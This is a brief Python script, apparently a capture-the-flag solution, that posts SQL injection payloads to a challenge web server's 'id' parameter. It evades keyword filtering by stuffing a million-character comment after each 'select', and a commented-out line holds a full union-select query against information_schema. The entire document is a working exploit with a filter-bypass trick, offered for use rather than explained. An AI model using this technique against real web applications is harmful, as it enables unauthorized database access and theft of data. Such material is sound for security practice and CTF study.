import requests

shit = "/*{}*/".format("a"*1000000)

payload = input(":").replace("select", "select"+shit)

#r = requests.post("http://chal.kaibro.tw:10007/index.php", data={"id":"'union select{}1,2,3 from information_schema.schemata-- ".format(shit)})
r = requests.post("http://chal.kaibro.tw:10007/index.php", data={"id":payload})

print(r.text)
